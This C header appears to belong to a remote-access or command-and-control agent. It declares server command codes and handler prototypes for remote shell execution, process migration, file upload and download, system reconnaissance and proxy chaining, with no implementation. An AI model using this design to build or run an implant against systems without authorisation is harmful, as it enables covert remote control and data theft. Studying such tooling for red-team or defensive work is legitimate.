#pragma once
#ifndef AGENT_COMMAND_H
#define AGENT_COMMAND_H

#include <stdint.h>
#include "agent_session.h"
#include "agent_protocol.h"

// Request Type
#define REQUEST_ASKCOMMAND 1
#define REQUEST_COMMANDDATA 2
#define REQUEST_REGISTER 3
#define REQUEST_COMMANDCOMPLETED 4

// Server Response Type
#define COMMAND_REGISTER 1
#define COMMAND_NOCOMMAND 2
#define COMMAND_TERMINATE 3
#define COMMAND_RUNSHELLCOMMAND 4
#define COMMAND_TERMINATESHELL 5
#define COMMAND_SYSINFO 6
#define COMMAND_SYSINFOEXTENDED 7
#define COMMAND_UPDATECONFIG 8
#define COMMAND_GETCONFIG 9
#define COMMAND_PUBLICIP 10
#define COMMAND_MIGRATE 11
#define COMMAND_PROCESSLIST 12
#define COMMAND_DOWNLOADFILES 13
#define COMMAND_UPLOADFILES 14
#define COMMAND_SLEEP 15
#define COMMAND_KILL 16
#define COMMAND_RUNPROGRAM 17
#define COMMAND_EXECPROGRAM 18
#define COMMAND_PROXYUSE 19
#define COMMAND_PROXYCLOSE 20
#define COMMAND_PROXYSTOP 21
#define COMMAND_PROXYCHAINCREATE 22
#define COMMAND_PROXYCHAINSTOP 23
#define COMMAND_PROXYINFO 24

typedef struct program_run_info_s program_run_info;
struct program_run_info_s {
	process_intercepted* process_intercepted;
	session* sess;
	packet* pck;	
};

typedef struct command_result_s command_result;
struct command_result_s {
	bool success;
	bool send_result;
	uint32_t error_code;
	void* data;
};

#define DECLARE_RESULT(x) \
	command_result* x = OBJ_ALLOC(command_result); \
	x->error_code = ERROR_UNKNOWN; \
	x->success = false

#define DECLARE_RESULT_WITH_FEEDBACK(x) \
	command_result* x = OBJ_ALLOC(command_result); \
	x->send_result = true; \
	x->error_code = ERROR_UNKNOWN; \
	x->success = false

#define SET_RESULT_SUCCESS(x) \
	x->success = true; \
	x->error_code = ERROR_OK

typedef command_result* (*command_callback)(session* sess, packet* pck);

typedef struct agent_command_s agent_command;
struct agent_command_s {
	uint32_t command_id;
	command_callback callback;
};

#define FREE_RESULT(r) \
do { \
	FREE(r->data); \
	FREE(r); \
} while(false)

// agent commands
extern command_result* cmd_sleep(session* sess, packet* pck);
extern command_result* cmd_migrate_to_process(session* sess, packet* pck);
extern command_result* cmd_run_program(session* sess, packet* pck);
extern command_result* cmd_shell_terminate(session* sess, packet* pck);
extern command_result* cmd_shell_run_command(session* sess, packet* pck);
extern command_result* cmd_download_files(session* sess, packet* pck);
extern command_result* cmd_upload_files(session* sess, packet* pck);
extern command_result* cmd_systeminfo(session* sess, packet* pck);
extern command_result* cmd_extended_systeminfo(session* sess, packet* pck);
extern command_result* cmd_exec_program(session* sess, packet* pck);
extern command_result* cmd_kill(session* sess, packet* pck);
extern command_result* cmd_proxy_use(session* sess, packet* pck);
extern command_result* cmd_proxy_close(session* sess, packet* pck);
extern command_result* cmd_proxy_stop(session* sess, packet* pck);
extern command_result* cmd_proxy_chain_create(session* sess, packet* pck);
extern command_result* cmd_proxy_chain_stop(session* sess, packet* pck);
extern command_result* cmd_proxy_info(session* sess, packet* pck);
#endif